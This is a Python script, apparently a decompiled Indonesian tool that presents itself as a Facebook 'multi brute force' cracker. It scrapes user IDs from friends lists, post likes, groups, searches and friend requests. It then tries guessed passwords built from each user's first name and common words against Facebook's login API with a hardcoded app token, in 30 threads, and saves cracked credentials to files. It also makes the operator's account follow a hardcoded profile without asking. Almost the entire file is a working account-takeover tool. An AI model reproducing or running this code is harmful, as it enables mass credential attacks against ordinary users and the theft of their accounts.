# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
#Pembuatan 05:12:2020

#Engkau Bilang Ini Recod Punya Orang. Ku Report Semu entr fb mu ANJENG

import os,sys,time,requests,json,re

from bs4 import BeautifulSoup as parser

from time import sleep

from concurrent.futures import ThreadPoolExecutor

from colorama import init, Fore, Back

B = Fore.BLUE

W = Fore.WHITE

C = Fore.CYAN

R = Fore.RED

G = Fore.GREEN

Y = Fore.YELLOW

id=[]

count=0

result=0

chek=0

die=0

check=[]

vuln=[]

mbasic="https://mbasic.facebook.com{}"

def clear():

    os.system('clear')

def baner():    

    print(f'''

\x1b[1;94m___  _______________

\x1b[1;94m|  \/  || ___ \  ___| \33[31;1m| (MBF) MULTI BRUTE FORCE |

\x1b[1;94m| .  . || |_/ / |_  \33[31;1mAUTHOR   \x1b[1;94m: \33[31;1mRIZKY FERDIANSYAH

\x1b[1;94m| |\/| || ___ \  _| \33[31;1mKOTA     \x1b[1;94m: \33[31;1mBANDUNG

\x1b[1;94m| |  | || |_/ / |   \33[31;1mFACEBOOK \x1b[1;94m: \33[31;1mRIZKY FERDIANSYAH XD.

\x1b[1;94m\_|  |_/\____/\_|   \33[31;1mWHATSAPP \x1b[1;94m: \33[31;1m0895362500008  ''')

    print()



def masuk():

    try:

          cek = open("cookies").read()

    except FileNotFoundError:

          cek = input("\033[00mCookie FB : \033[1;96m")

    cek = {"cookie":cek}

    ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content

    if "mbasic_logout_button" in str(ismi):

        if "Apa yang Anda pikirkan sekarang" in str(ismi):

            with open("cookies","w") as f:

                 f.write(cek["cookie"])

        else:

            try:

                 requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)

            except:

                 pass

        try:

             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]

             ses.get(mbasic.format(ikuti),cookies=cek)

        except:

             pass

        return cek["cookie"]

    else:

        print('\033[00mCookies \033[91mInvalid\033[00m')

        time.sleep(1)

        os.system('python fb.py')

def nid():

    r=ses.get(mbasic.format('/me'),cookies=kukis).text

    name=re.findall(r'<title>(.*?)</title>',r)[0]

    uid=re.findall(r'name="target" value="(.*?)"',r)[0]

    print('\033[91m─────────────────────────────────────────────────')

    print('\033[91m                 INFORMASI AKUN')

    print('\033[91m─────────────────────────────────────────────────')

    print("\x1b[1;94m               Nama \033[91m: \33[31;1m"+name)

    print("\x1b[1;94m               ID   \033[91m: \33[31;1m"+uid)

    print('\033[91m─────────────────────────────────────────────────')

def temanid(url):

    req=requests.get(url,cookies=kukis).content

    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))

    for x in getuser:

        if 'profile' in x[0]:

            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])

        elif 'friends' in x:

            continue

        else:

            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])

        print(f'\r\x1b[1;94mMengambil ID: \33[31;1m{str(len(id))}',end='')

    if 'Lihat Teman Lain' in str(req):

        temanid(mbasic.format(parser(req,'html.parser').find('a',string='Lihat Teman Lain')['href']))

    return id

def targetteman(url):

    req=requests.get(url,cookies=kukis).content

    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))

    for x in getuser:

        if 'profile' in x[0]:

            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])

        elif 'friends' in x:

            continue

        else:

            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])

        print(f'\r\x1b[1;94mMengambil ID: \33[31;1m{str(len(id))}',end='')

    if 'Lihat Teman Lain' in str(req):

        targetteman(mbasic.format(parser(req,'html.parser').find('a',string='Lihat Teman Lain')['href']))

    return id

def like(url):

    try:

        req=requests.get(url,cookies=kukis).content

        lk=re.findall(r'href="(/ufi.*?)"',str(req))[0]

        aws=getlike(mbasic.format(lk))

        return aws

    except:

        print('\33[31;1mLink Postingan: \033[00m')

        sleep(1)

        menu()

def getlike(react):

    like=requests.get(react,cookies=kukis).content

    lkusr= re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))

    for user in lkusr:

        if 'profile' in user[0]:

            id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])

        else:

            id.append(user[1] + "|" + user[0].split('/')[1])

        print(f'\r\x1b[1;94mMengambil ID: \33[31;1m{str(len(id))}',end='')

    if 'Lihat Selengkapnya' in str(like):

        getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))

    return id 

def grupid(url):

    req=requests.get(url,cookies=kukis).content

    users=re.findall(r'a class=".." href="/(.*?)">(.*?)</a>',str(req))

    for user in users:

        if "profile" in user[0]:

            id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])

        else:

            id.append(user[1] + "|" + user[0])

        print(f'\r\x1b[1;94mMengambil ID: \33[31;1m{str(len(id))}',end='')

    if "Lihat Selengkapnya" in str(req):

        grupid(mbasic.format(parser(req,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))

    return id

def search(url):

    req=requests.get(url,cookies=kukis).content

    users=re.findall(r'class="s cc"><a href="(.*?)"><div class=".."><div class="..">(.*?)</div></div>',str(req))

    for user in users:

        if "profile" in user[0]:

            id.append(user[1] + "|" + re.findall("id=(\d*)",str(user[0]))[0])

        else:

            id.append(user[1] + "|" + user[0].split("?")[0])

        print(f'\r\x1b[1;94mMengambil ID: \33[31;1m{str(len(id))}',end='')

    if "Lihat Hasil Selanjutnya" in str(req):

        search(parser(req,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])

    return id

def kmn(url):

    req=requests.get(url,cookies=kukis).content

    users=re.findall(r'middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))

    for user in users:

        if "mbasic" in user[0]:

            id.append(user[1] + '|' + re.findall("uid=(\d*)",str(user[0]))[0])

        else:

            id.append(user[1] + '|' + re.findall("=(\d*)",str(user[0]))[0])

        print(f"\r\x1b[1;94mMengambil ID: \33[31;1m{str(len(id))}",end="")

    if "Lihat selengkapnya" in str(req):

        kmn(mbasic.format(parser(req,"html.parser").find("a",string="Lihat selengkapnya")["href"]))

    return id

def login(username,password,cek=False):

          global die,result,chek,count

          b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"

          params = {

                     'access_token': b,

                     'format': 'JSON',

                     'sdk_version': '2',

                     'email': username,

                     'locale': 'en_US',

                     'password': password,

                     'sdk': 'ios',

                     'generate_session_cookies': '1',

                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',

          }

          api = 'https://b-api.facebook.com/method/auth.login'

          response = requests.get(api, params=params)

          if 'EAA' in response.text:

              print(f"\r\x1b[1;94m[\x1b[1;94mOK\x1b[1;94mm] \x1b[1;94m{username}\x1b[1;94m••\x1b[1;94m{password}                        ",end="")

              print()

              result += 1

              if cek:

                      vuln.append(username+"••"+password)

              else:

                      with open('ok.txt','a') as f:

                           f.write(username + '••' + password + '\n')

          elif 'www.facebook.com' in response.json()['error_msg']:

                print(f"\r\33[31;1m[\33[31;1mCP\33[31;1m] \33[31;1m{username} \33[31;1m•• \33[31;1m{password}                      ",end="")

                print()

                chek += 1

                if cek:

                      check.append(username+"••"+password)

                else:

                      with open('cp.txt','a') as f:

                           f.write(username + '••' + password + '\n')

          else:

                die += 1

          tk=['\x1b[1;94m©','\33[31;1m®','\x1b[1;94m©','\33[31;1m®']

          for o in tk:

                     print(f"\r\033[00m[{o}\033[00m] \x1b[1;94mOK : \x1b[1;94m{str(result)} \33[31;1mCP : \033[31;1m{str(chek)} \033[00mMati : \033[1;91m{str(die)}\033[00m",end="")

                     time.sleep(0.2)

def menu():

    clear()

    baner()

    nid()

    print('''

\x1b[1;94m─────────────────────────────────────────

\x1b[1;94m[ 1 ] \33[31;1mCrack Dari Daftar Teman

\x1b[1;94m[ 2 ] \33[31;1mCrack Dari Target Teman

\x1b[1;94m[ 3 ] \33[31;1mCrack Dari Like Postingan

\x1b[1;94m[ 4 ] \33[31;1mCrack Member Grup

\x1b[1;94m[ 5 ] \33[31;1mCrack Dari Pencarian Nama

\x1b[1;94m[ 6 ] \33[31;1mCrack Dari Permintaan Pertemanan

\x1b[1;94m[ 0 ] \x1b[1;94mKeluar

\x1b[1;94m─────────────────────────────────────────''')

    pilih_menu()

def pilih_menu():

    ff=input('\33[31;1mPilih Nomor Nya : \x1b[1;94m')

    if ff == '1':

       clear()

       baner()

       nid()

       usr=parser(ses.get(mbasic.format('/me'),cookies=kukis).content,'html.parser').find('a',string='Teman')

       username=temanid(mbasic.format(usr['href']))

       with ThreadPoolExecutor(max_workers=30) as ex:

            for user in username:

                aa=user.split('|')

                bb=aa[0].split(' ')

                for x in bb:

                    litpas=[

                         str(x) + '123',

                         str(x) + '1234',

                         str(x) + '12345',

                         str(x) + '123456'

                         ]

                    litpas.append('Sayang')

                    litpas.append('Bangsat')

                    litpas.append('Kontol')

                    litpas.append('Anjing')

                    litpas.append('bangladesh')

                    litpas.append('pakistan')

                    litpas.append('menikah')

                    litpas.append('102030')

                    litpas.append('786786')

                    litpas.append('112233')

                    for passw in set(litpas):

                        ex.submit(login,(aa[1]),(passw))

       print('\n\033[00m[\033[96m*\033[00m]Done.')

    elif ff == '2':

       clear()

       baner()

       nid()

       asw=input('\x1b[1;94mID Target: \33[31;1m')

       if asw.isdigit():

          asw='/profile.php?id='+asw

       else:

          asw='/'+asw

       try:

           usr=parser(ses.get(mbasic.format(asw),cookies=kukis).content,'html.parser').find('a',string='Teman')

           username=targetteman(mbasic.format(usr["href"]))

       except TypeError:

           print('\33[31;1mID Tidak Ada\33[31;1m')

           sleep(1)

           menu()

       with ThreadPoolExecutor(max_workers=30) as ex:

            for user in username:

                aa=user.split('|')

                bb=aa[0].split(' ')

                for x in bb:

                    litpas=[

                         str(x) + '123',

                         str(x) + '1234',

                         str(x) + '12345',

                         str(x) + '123456'

                         ]

                    litpas.append('Sayang')

                    litpas.append('Bangsat')

                    litpas.append('Kontol')

                    litpas.append('Anjing')

                    litpas.append('bangladesh')

                    litpas.append('pakistan')

                    litpas.append('menikah')

                    litpas.append('102030')

                    litpas.append('786786')

                    litpas.append('112233')

                    for passw in set(litpas):

                        ex.submit(login,(aa[1]),(passw))

       print('\n\033[00m[\033[96m*\033[00m]Done.')

    elif ff == '3':

         clear()

         baner()

         nid()

         asw=input('\x1b[1;94mlink Postingan: \33[31;1m')

         if 'www.facebook' in asw:

             asw=asw.replace('www.facebook','mbasic.facebook')

         elif 'm.facebook.com' in asw:

             asw=asw.replace('m.facebook.com','mbasic.facebook.com')

         elif asw == '':

             print('\033[91mDont Be Empty!\033[00m')

             sleep(1)

             menu()

         username=like(asw)

         with ThreadPoolExecutor(max_workers=30) as ex:

              for user in username:

                  aa=user.split('|')

                  bb=aa[0].split(' ')

                  for x in bb:

                      litpas=[

                           str(x) + '123',

                           str(x) + '1234',

                           str(x) + '12345',

                           str(x) + '123456'

                           ]

                      litpas.append('Sayang')

                      litpas.append('Bangsat')

                      litpas.append('Kontol')

                      litpas.append('Anjing')

                      litpas.append('bangladesh')

                      litpas.append('pakistan')

                      litpas.append('menikah')

                      litpas.append('102020')

                      litpas.append('786786')

                      litpas.append('112233')

                      for passw in set(litpas):

                          ex.submit(login,(aa[1]),(passw))

         print('\n\033[00m[\033[96m*\033[00m]Done.')

    elif ff == '4':

         clear()

         baner()

         nid()

         asw=input('\x1b[1;94mID Grup: \33[31;1m')

         username=grupid(mbasic.format('/browse/group/members/?id='+asw))

         with ThreadPoolExecutor(max_workers=30) as ex:

              for user in username:

                  aa=user.split('|')

                  bb=aa[0].split(' ')

                  for x in bb:

                      litpas=[

                           str(x) + '123',

                           str(x) + '1234',

                           str(x) + '12345',

                           str(x) + '123456'

                           ]

                      litpas.append('Sayang')

                      litpas.append('Bangsat')

                      litpas.append('Kontol')

                      litpas.append('Anjing')

                      litpas.append('bangladesh')

                      litpas.append('pakistan')

                      litpas.append('menikah')

                      litpas.append('102030')

                      litpas.append('786786')

                      litpas.append('112233')

                      for passw in set(litpas):

                          ex.submit(login,(aa[1]),(passw))

         print('\n\033[00m[\033[96m*\033[00m]selesai.')

    elif ff == '5':

         clear()

         baner()

         nid()

         asw=input('\x1b[1;94mNama: \33[31;1m')

         username=search(mbasic.format('/search/people/?q='+asw))

         with ThreadPoolExecutor(max_workers=30) as ex:

              for user in username:

                  aa=user.split('|')

                  bb=aa[0].split(' ')

                  for x in bb:

                      litpas=[

                           str(x) + '123',

                           str(x) + '1234',

                           str(x) + '12345',

                           str(x) + '123456'

                           ]

                      litpas.append('Sayang')

                      litpas.append('Bangsat')

                      litpas.append('Kontol')

                      litpas.append('Anjing')

                      litpas.append('bangladesh')

                      litpas.append('pakistan')

                      litpas.append('menikah')

                      litpas.append('102030')

                      litpas.append('786786')

                      litpas.append('112233')

                      for passw in set(litpas):

                          ex.submit(login,(aa[1]),(passw))

         print('\n\033[00m[\033[96m*\033[00m]Done.')

    elif ff == '6':

         clear()

         baner()

         nid()

         username=kmn(mbasic.format('/friends/center/requests/#friends_center_main'))

         with ThreadPoolExecutor(max_workers=30) as ex:

              for user in username:

                  aa=user.split('|')

                  bb=aa[0].split(' ')

                  for x in bb:

                      litpas=[

                           str(x) + '123',

                           str(x) + '1234',

                           str(x) + '12345',

                           str(x) + '123456'

                           ]

                      litpas.append('Sayang')

                      litpas.append('Bangsat')

                      litpas.append('Kontol')

                      litpas.append('Anjing')

                      litpas.append('bangladesh')

                      litpas.append('pakistan')

                      litpas.append('menikah')

                      litpas.append('102030')

                      litpas.append('112233')

                      litpas.append('786786')

                      for passw in set(litpas):

                          ex.submit(login,(aa[1]),(passw))

         print('\n\033[00m[\033[96m*\033[00m]Done.')

    elif ff == '0':

         sys.exit('\033[1;97mTerimaKasih Telah Memakai Script Ku..:)\n\033[91mKeluar\033[00m')

    else:

         print('\033[91misi yang benar!\033[00m')

         sleep(1)

         menu()

if __name__=="__main__":

     clear()

     baner()

     ses=requests.Session()

     kuki=masuk()

     kukis={'cookie':kuki}

     menu()

     


